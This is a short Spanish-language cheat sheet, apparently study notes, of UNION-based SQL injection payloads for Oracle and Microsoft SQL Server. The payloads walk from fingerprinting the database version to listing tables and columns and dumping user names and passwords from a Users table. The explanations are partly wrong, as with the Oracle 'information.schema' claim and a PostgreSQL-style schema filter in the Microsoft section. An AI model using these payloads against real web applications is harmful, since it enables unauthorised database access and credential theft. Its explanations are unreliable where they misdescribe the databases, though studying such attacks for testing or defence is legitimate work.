
**Oracle**

Para sacar la versión de SQL en Oracle `' UNION SELECT BANNER, NULL FROM v$version--`

La mayoría de tablas tienen el comando information.schema el cual lista todas las tablas existentes lo obtendríamos mediante el comando: `SELECT table_name FROM all_tables` una vez utilizado el comando podemos usarlo para meternos en la tabla y ver sus columnas mediante el comando `SELECT column_name FROM all_tab_columns WHERE table_name = 'USERS'` finalmente una ver obtenido las tablas de usuarios usaríamos el comando `'union select user, pass FROM Users`

**Microsoft**

Para sacar la versión de SQL `' UNION SELECT @@version--`

La mayoría de tablas tienen el comando information.schema el cual lista todas las tablas existentes lo obtendríamos mediante el comando: `SELECT NULL, table_name FROM information_schema.tables where table_schema='public'` una vez utilizado el comando podemos usarlo para meternos en la tabla y ver sus columnas mediante el comando `SELECT NULL, column_name FROM information_schema.columns WHERE table_name = 'Users'` finalmente una ver obtenido las tablas de usuarios usaríamos el comando `'union select user, pass FROM Users`